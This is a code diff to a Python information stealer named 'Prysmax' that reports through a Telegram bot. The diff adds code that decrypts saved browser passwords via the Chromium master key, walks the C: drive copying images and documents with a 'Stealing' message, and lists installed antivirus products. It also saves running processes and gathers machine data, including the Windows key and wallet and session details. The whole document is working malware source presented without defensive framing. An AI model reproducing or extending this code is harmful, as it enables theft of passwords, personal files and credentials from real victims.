@@ -19,6 +19,9 @@ bot = Bot(token=prysmax)
 appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
 
+search_in = "Default"
+extensions_to_search = ['.png', '.jpg', '.pdf', '.docx'] # If you want to add more, add :))
+
 browsers = {
     'amigo': appdata + '\\Amigo\\User Data',
     'torch': appdata + '\\Torch\\User Data',
@@ -43,7 +46,7 @@ def check_and_close_browser(browser_name):
         if browser_name.lower() in process.info['name'].lower():
             try:
                 os.kill(process.info['pid'], 9)
-                print(f"¡Adiós {browser_name}! ¡Cerrado con estilo!")
+                print(f"¡Adiós {browser_name}! ")
             except PermissionError:
                 print(f"No tienes permisos para cerrar {browser_name}.")
             except Exception as e:
@@ -53,21 +56,30 @@ def get_master_key(path: str):
         if not os.path.exists(path):
             return
 
-        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+        local_state_path = os.path.join(path, "Local State")
+        if not os.path.exists(local_state_path):
             return
 
-        with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        with open(local_state_path, "r", encoding="utf-8") as f:
             c = f.read()
+
         local_state = json.loads(c)
+
+        if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
+            return
 
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
-    except FileNotFoundError:
-        pass
+    except Exception as e:
+        print(f"Error in get_master_key: {str(e)}")
+        return None
 
 def decrypt_password(buff: bytes, master_key: bytes) -> str:
+    if master_key is None:
+        return "Error: Master key is None"
+
     iv = buff[3:15]
     payload = buff[15:]
     cipher = AES.new(master_key, AES.MODE_GCM, iv)
@@ -75,7 +87,6 @@ def decrypt_password(buff: bytes, master_key: bytes) -> str:
     try:
         decrypted_pass = decrypted_pass[:-16].decode(errors='ignore')
     except UnicodeDecodeError:
-        # Manejar el error, imprimir un mensaje o realizar alguna acción adecuada
         decrypted_pass = "Error al decodificar la contraseña"
     return decrypted_pass
 
@@ -94,15 +105,15 @@ def save_results(browser_name, data_type, content):
     total_browsers += 1
 
 def get_login_data(path: str, profile: str, master_key):
-    login_db = f'{path}\\{profile}\\Login Data'
+    login_db = os.path.join(path, profile, 'Login Data')
     if not os.path.exists(login_db):
-        return
+        return ""
 
     result = ""
-    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
+    shutil.copy(login_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
 
     try:
-        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
+        conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
         cursor = conn.cursor()
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
         for row in cursor.fetchall():
@@ -111,23 +122,14 @@ def get_login_data(path: str, profile: str, master_key):
             URL: {row[0]}
             Email: {row[1]}
             Password: {password}
-            
             """
     except sqlite3.DatabaseError as e:
-        print(f"No se pudo acceder a la base de datos. Detalles: {str(e)}")
-
-        # Cierra todos los navegadores
-        for browser in available_browsers:
-            browser_path = browsers[browser]
-            check_and_close_browser(browser)
-
-        print(f"No se pudo acceder al navegador para obtener datos. Navegador problemático: {browser}")
-
+        print(f"Error accessing the database. Details: {str(e)}")
     finally:
         if conn:
             conn.close()
 
-    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
+    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
     return result
 
 
@@ -259,11 +261,52 @@ for browser in available_browsers:
         shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
 if not os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax'):
     os.mkdir(user+'\\AppData\\Local\\Temp\\Prysmax')
-if os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax'):
-    os.remove(user+"\\AppData\\Local\\Temp\\Prysmax\\Browser.zip")
 shutil.move(user+'\\AppData\\Local\\Temp\\Browser.zip', user+'\\AppData\\Local\\Temp\\Prysmax')
 
+import os
 
+def find_antivirus_folders(base_folder):
+    antivirus_names = [
+        "Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "Sophos"
+        "ESET", "Malwarebytes", "Avira", "Panda", "Trend Micro", "F-Secure", "McAfee", "Comodo", "Avira", 
+        "BullGuard", "360 Total Security", "Ad-Aware", "Dr.Web", "G-Data", "Vipre", "ClamWin", "ZoneAlarm",
+        "Cylance", "Webroot", "Cylance", "Palo Alto Networks", "Symantec", "SentinelOne", "CrowdStrike",
+        "Emsisoft", "HitmanPro", "Fortinet", "Trend Micro", "Emsisoft", "FireEye", "Cylance", "ESET",
+        "Zemana", "McAfee", "Windows Defender"
+    ]
+    antivirus_folders_dict = {}
+
+    antivirus_folders_set = set()
+
+    for folder in os.listdir(base_folder):
+        full_path = os.path.join(base_folder, folder)
+
+        if os.path.isdir(full_path):
+            for antivirus_name in antivirus_names:
+                if antivirus_name.lower() in folder.lower():
+                    antivirus_folders_dict[antivirus_name] = folder
+
+    return antivirus_folders_dict
+
+    return antivirus_folders_set
+
+
+
+def search_and_copy_files(start_folder, dest_folder, search_all=False):
+    specific_folders = ['Desktop', 'Documents', 'Downloads', 'Pictures']
+
+    for root, dirs, files in os.walk(start_folder):
+        if not search_all:
+            dirs[:] = [d for d in dirs if d in specific_folders]
+
+        for file in files:
+            file_path = os.path.join(root, file)
+            _, extension = os.path.splitext(file_path)
+
+            if extension.lower() in extensions_to_search:
+                destination_path = os.path.join(dest_folder, file)
+                shutil.copy(file_path, destination_path)
+                print(f"Stealing {file_path} to {destination_path}")
 def machine_info():
 
 
@@ -303,6 +346,46 @@ def machine_info():
     ip_city = ip.get("city", "Error")
     ip_isp = ip.get("isp", "Error")
     ip_proxy = ip.get("proxy", "Error")
+    
+    tasklists = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
+    
+    main_folders = [os.path.expanduser("~"), os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')]
+    
+    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax\\files'):
+     os.mkdir(user+'\\AppData\\Local\\Temp\\Prysmax\\files')
+    else:
+        os.removedirs(user+'\\AppData\\Local\\Temp\\Prysmax\\files')
+    
+    
+    if search_in == "Default":
+     for folder in main_folders:
+        search_and_copy_files("C:\\", user+'\\AppData\\Local\\Temp\\Prysmax\\files')
+    else:
+        search_and_copy_files("C:\\", user+'\\AppData\\Local\\Temp\\Prysmax\\files', search_all=False)
+    
+
+    antivirus_folders = find_antivirus_folders("C:\\Program Files")
+
+    if antivirus_folders:
+        print("Antivirus encontrados:")
+        for antivirus_name, folder_name in antivirus_folders.items():
+            print(f"{antivirus_name}: {folder_name}")
+    else:
+        print("not foun.")
+        
+
+    
+    
+    process_task = False
+    if tasklists.returncode == 0:
+     with open(user+'\\AppData\\Local\\Temp\\Prysmax\\process_list.txt', 'w') as file:
+        file.write(tasklists.stdout)
+     print('The process list has been saved in "process_list.txt".')
+     num_procesos = tasklists.stdout.count('\n') - 3
+     process_task = True
+    else:
+     print('There was an error in obtaining the list of processes.')
+     process_task = False
     with open(user+'\\AppData\\Local\\Temp\\Prysmax\\information.txt', 'w', encoding='utf-8') as archivo:
         # Escribe información en el archivo
         archivo.write(f"""
@@ -326,7 +409,8 @@ def machine_info():
     ╠       ╒ RAM: {pc_ram}
     ╠        ╒ GPU: {pc_gpu}
     ╠         ╒ Windows Key: {pc_key}
-    ╠
+    ╠           ╒  Antiviruses: {antivirus_name}
+                  ╒ List of process: {num_procesos}
 
 """)
     tokens = []
@@ -467,7 +551,7 @@ def machine_info():
     ╠       ╒ RAM: {pc_ram}
     ╠        ╒ GPU: {pc_gpu}
     ╠         ╒ Windows Key: {pc_key}
-    
+               ╒ Antiviruses: {antivirus_name}
 
     ╠    Sessions - 💶
     
@@ -480,6 +564,8 @@ def machine_info():
     ╠   Exodus: {exodus}
 
     ╠   Screenshot: {screenshot}
+    
+    ╠   Process Running: {num_procesos}
     """  
     temp_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')
 
